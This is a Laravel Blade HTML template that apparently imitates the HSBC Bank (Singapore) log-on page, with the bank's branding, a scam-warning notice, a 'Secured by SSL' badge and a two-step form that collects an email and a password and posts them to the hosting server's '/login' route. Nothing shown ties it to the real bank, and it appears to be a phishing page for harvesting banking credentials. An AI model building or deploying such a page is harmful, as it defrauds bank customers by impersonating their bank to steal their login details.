
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>HSBC</title>
    <link rel="stylesheet" href="{{ asset('login.css') }}" />

</head>
<body>
<div id="root">
    <div class="page-wrapper-22">
        <div
            class="header-login d-flex justify-content-end align-items-center"
        ></div>
        <div style="margin-left: -90px; background-color: white">
            <img
                src="{{ asset('Logo.jpg') }}"
                alt="logo"
                style="
              width: 140px;
              padding-top: 30px;
              padding-bottom: 30px;
              margin-left: 204px;
            "
            />

        </div>
        <div class="info-p">
            <p>
                Beware of criminals using current world events to solicit donations
                for fraudulent organizations. If you are looking to support through
                a donation below are some simple steps you can take to safe guard
                your money:
            </p>
            <ol>
                <li>
                    Research the organization yourself – make sure it is legitimate,
                    and doesn’t just sound like one you have heard of before.
                </li>
                <li>
                    Be wary of requests to send cash, wire money or send gift cards.
                </li>
                <li>
                    Avoid clicking on links or downloading attachments from
                    unsolicited emails, texts or social media.
                </li>
                <li>
                    Donate through secure websites that you have authenticated through
                    trusted sources.
                </li>
                <li>
                    Don’t give in to undue pressure – legitimate organizations
                    understand you need to do your research and use proper payment
                    methods.
                </li>
            </ol>
            <p>
                Protect your personal information and your finances by not falling
                for these scams.
            </p>
        </div>
        <div
            class="d-flex justify-content-center"
            style="display: flex; justify-content: center"
        >
            <div
                id="carouselExampleControls"
                class="carousel slide login-container"
                data-bs-ride="carousel"
                data-bs-touch="false"
                data-bs-interval="false"
                style="
              background-color: white;
              width: 450px;
              height: 400px;
              padding: 0 20px;
              margin-top: 150px;
              border: 1px solid black;
              border-radius: 5px;
            "
            >
                <div class="carousel-inner p-4" style="position: relative; width: 100%; overflow: hidden">
                    <h1 class="pt-0" style="margin: 0; font-size: 2.4em; font-weight: 300; line-height: 1.2em; padding: 0 0 23px; margin-left: 30px; margin-top: 30px; color: rgb(42, 39, 39);">
                        Log on
                    </h1>
                    <form method="POST" action="/login">
                        @csrf
                        <div class="carousel-item active">
                            <div class="form-login-group" style="display: flex; flex-direction: column; align-items: center;">
                                <label for="username" class="form-label login-label" style="margin-left: -68%; margin-bottom: 10px; color: #666666;">Enter your Email</label>
                                <input type="text" class="form-control" id="username" name="username" style="display: block; width: 90%; padding: 0.375rem 0.75rem; font-size: 1rem; font-weight: 400; line-height: 1.5; color: #212529; background-color: #fff; background-clip: padding-box; border: 1px solid #ced4da; -webkit-appearance: none; -moz-appearance: none; appearance: none; border-radius: 0.25rem; transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;" />
                            </div>
                            <div class="pt-2" style="font-size: 1rem; font-weight: 100; margin-top: 10px; color: #666666; margin-left: 3%;">
                                <a href="#" class="carrousel-username">Forgot username ?</a>
                            </div>
                            <div class="d-flex justify-content-center">
                                <button
                                    type="button"
                                class="btn login-btn"
                                id="continueBtn"
                                data-bs-target="#carouselExampleControls"
                                data-bs-slide="next"
                                style="margin-top: 80px; margin-bottom: 15px; margin-left: 55%; border-radius: 5%;"
                                >
                                Continue
                                </button>
                            </div>
                        </div>
                        <div class="carousel-item">
                            <div class="form-login-group">
                                <label for="password" class="form-label login-label" style="margin-left: -62%">Enter your password</label>
                                <input type="password" class="form-control" id="password" name="password"/>
                            </div>
                            <div class="pt-2" style="font-size: 1rem; font-weight: 100">
                                <div class="d-flex align-items-center gap-2">
                                    <input type="checkbox" style="width: 15px; height: 15px; color: rgb(221, 221, 221);" /><span>Remember me</span>
                                </div>
                            </div>
                            <div class="d-flex justify-content-center">
                                <button type="submit" class="btn login-btn" data-bs-target="#carouselExampleControls" data-bs-slide="next" style="margin-top: 80px; margin-bottom: 15px; margin-left: 55%; border-radius: 5%;">Log On</button>
                            </div>
                        </div>

                    </form>
                </div>

                <div
                    style="border: 0.5px solid rgb(215, 215, 215); opacity: 0.5"
                ></div>
                <table style="margin-top: 15px">
                    <tr>
                        <td>
                            <svg
                                stroke="currentColor"
                                fill="currentColor"
                                stroke-width="0"
                                viewBox="0 0 448 512"
                                height="1em"
                                width="1em"
                                xmlns="http://www.w3.org/2000/svg"
                                style="
                      color: rgb(102, 102, 102);
                      justify-content: flex-end;
                      display: flex;
                      box-sizing: border-box;
                    "
                            >
                                <path
                                    d="M400 224h-24v-72C376 68.2 307.8 0 224 0S72 68.2 72 152v72H48c-26.5 0-48 21.5-48 48v192c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V272c0-26.5-21.5-48-48-48zm-104 0H152v-72c0-39.7 32.3-72 72-72s72 32.3 72 72v72z"
                                ></path>
                            </svg>
                        </td>
                        <td>
                            <h6
                                class=""
                                style="
                      font-weight: 200;
                      color: rgb(102, 102, 102);
                      font-size: 1rem;
                      margin-top: 3px;
                      margin-bottom: 0;
                      margin-left: 10px;
                      line-height: 1.2;
                    "
                            >
                                Secured by SSL
                            </h6>
                        </td>
                    </tr>
                </table>
            </div>
        </div>
        <div style="margin-top: 12%">
            <div class="footer-login text-white">
                <center>
                    <table style="margin: 0px 10px">
                        <tr>
                            <td class="tddd">
                                <div class="col-3 columns">
                                    <div class="d-flex align-items-center gap-3">
                                        <svg
                                            stroke="currentColor"
                                            fill="currentColor"
                                            stroke-width="0"
                                            viewBox="0 0 512 512"
                                            height="1em"
                                            width="1em"
                                            xmlns="http://www.w3.org/2000/svg"
                                            style="color: white"
                                        >
                                            <path
                                                d="M497.39 361.8l-112-48a24 24 0 0 0-28 6.9l-49.6 60.6A370.66 370.66 0 0 1 130.6 204.11l60.6-49.6a23.94 23.94 0 0 0 6.9-28l-48-112A24.16 24.16 0 0 0 122.6.61l-104 24A24 24 0 0 0 0 48c0 256.5 207.9 464 464 464a24 24 0 0 0 23.4-18.6l24-104a24.29 24.29 0 0 0-14.01-27.6z"
                                            ></path>
                                        </svg>
                                        <div
                                            class=""
                                            style="
                            font-weight: 500;
                            font-size: 0.8rem;
                            color: white;
                          "
                                        >
                                            contact us
                                        </div>
                                    </div>
                                    <div
                                        class="pt-2 ps-4 ms-2"
                                        style="
                          font-size: 0.7rem;
                          font-weight: 200;
                          color: white;
                        "
                                    >
                                        Chat, call or make an appointment
                                    </div>
                                </div>
                            </td>
                            <td class="tddd">
                                <div class="col-3 columns">
                                    <div class="d-flex align-items-center gap-3 ms-3">
                                        <svg
                                            style="color: white"
                                            stroke="currentColor"
                                            fill="currentColor"
                                            stroke-width="0"
                                            viewBox="0 0 384 512"
                                            height="1em"
                                            width="1em"
                                            xmlns="http://www.w3.org/2000/svg"
                                        >
                                            <path
                                                d="M215.7 499.2C267 435 384 279.4 384 192C384 86 298 0 192 0S0 86 0 192c0 87.4 117 243 168.3 307.2c12.3 15.3 35.1 15.3 47.4 0zM192 128a64 64 0 1 1 0 128 64 64 0 1 1 0-128z"
                                            ></path>
                                        </svg>
                                        <div
                                            class=""
                                            style="
                            font-weight: 500;
                            font-size: 0.8rem;
                            color: white;
                          "
                                        >
                                            Find a branch
                                        </div>
                                    </div>
                                    <div
                                        class="pt-2 ps-4 ms-4"
                                        style="
                          font-size: 0.7rem;
                          font-weight: 200;
                          color: white;
                        "
                                    >
                                        Locate your nearest ATM or branch
                                    </div>
                                </div>
                            </td>
                            <td class="tddd">
                                <div class="col-3 columns">
                                    <div class="d-flex align-items-center gap-3 ms-3">
                                        <svg
                                            style="color: white"
                                            stroke="currentColor"
                                            fill="currentColor"
                                            stroke-width="0"
                                            viewBox="0 0 512 512"
                                            height="1em"
                                            width="1em"
                                            xmlns="http://www.w3.org/2000/svg"
                                        >
                                            <path
                                                d="M256 8C119.043 8 8 119.083 8 256c0 136.997 111.043 248 248 248s248-111.003 248-248C504 119.083 392.957 8 256 8zm0 110c23.196 0 42 18.804 42 42s-18.804 42-42 42-42-18.804-42-42 18.804-42 42-42zm56 254c0 6.627-5.373 12-12 12h-88c-6.627 0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h12v-64h-12c-6.627 0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h64c6.627 0 12 5.373 12 12v100h12c6.627 0 12 5.373 12 12v24z"
                                            ></path>
                                        </svg>
                                        <div
                                            class=""
                                            style="
                            font-weight: 500;
                            font-size: 0.8rem;
                            color: white;
                          "
                                        >
                                            Help &amp; Support
                                        </div>
                                    </div>
                                    <div
                                        class="pt-2 ps-4 ms-4"
                                        style="
                          font-size: 0.7rem;
                          font-weight: 200;
                          color: white;
                        "
                                    >
                                        FAQs, Fees &amp; Charges and Policies
                                    </div>
                                </div>
                            </td>
                            <td class="tddd">
                                <div class="col-3 columns">
                                    <div class="d-flex align-items-center gap-3 ms-3">
                                        <svg
                                            style="color: white"
                                            stroke="currentColor"
                                            fill="none"
                                            stroke-width="2"
                                            viewBox="0 0 24 24"
                                            stroke-linecap="round"
                                            stroke-linejoin="round"
                                            height="1em"
                                            width="1em"
                                            xmlns="http://www.w3.org/2000/svg"
                                        >
                                            <path
                                                stroke="none"
                                                d="M0 0h24v24H0z"
                                                fill="none"
                                            ></path>
                                            <path d="M3 12a9 9 0 1 0 18 0a9 9 0 0 0 -18 0"></path>
                                            <path d="M3.6 9h16.8"></path>
                                            <path d="M3.6 15h16.8"></path>
                                            <path d="M11.5 3a17 17 0 0 0 0 18"></path>
                                            <path d="M12.5 3a17 17 0 0 1 0 18"></path>
                                        </svg>
                                        <div
                                            class=""
                                            style="
                            font-weight: 500;
                            font-size: 0.8rem;
                            color: white;
                          "
                                        >
                                            About HSBC
                                        </div>
                                    </div>
                                    <div
                                        class="pt-2 ps-4 ms-4"
                                        style="
                          font-size: 0.7rem;
                          font-weight: 200;
                          color: white;
                        "
                                    >
                                        Careers, media, investor and corporate information
                                    </div>
                                </div>
                            </td>
                        </tr>
                    </table>
                </center>
                <div class="" style="background-color: rgb(10, 12, 13)">
                    <div class="container d-flex text-white justify-content-end py-4">
                        <h6
                            class="text-end"
                            style="
                    font-size: 0.8em;
                    letter-spacing: 0.3px;
                    font-weight: 200;
                  "
                        >
                            HSBC Bank (Singapore) Limited | © Copyright HSBC Bank
                            (Singapore) Limited<br />
                            2024. All rights reserved
                        </h6>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<script>
    document.addEventListener("DOMContentLoaded", function () {
        const carouselItems = document.querySelectorAll(".carousel-item");
        let currentIndex = 0;

        function showSlide(index) {
            const prevIndex = currentIndex;
            const nextIndex = index;

            carouselItems[prevIndex].classList.remove("active");
            carouselItems[nextIndex].classList.add("active");

            if (nextIndex > prevIndex) {
                carouselItems[nextIndex].classList.add("next");
            } else {
                carouselItems[nextIndex].classList.add("prev");
            }

            currentIndex = nextIndex;

            setTimeout(() => {
                carouselItems[prevIndex].classList.remove("next", "prev");
                carouselItems[nextIndex].classList.remove("next", "prev");
            }, 500);
        }

        const continueBtn = document.getElementById("continueBtn");

        continueBtn.addEventListener("click", function (event) {
            event.preventDefault(); // Prevent the default action
            showSlide(1); // Change index to the next slide
        });

    });
</script>
</body>
</html>
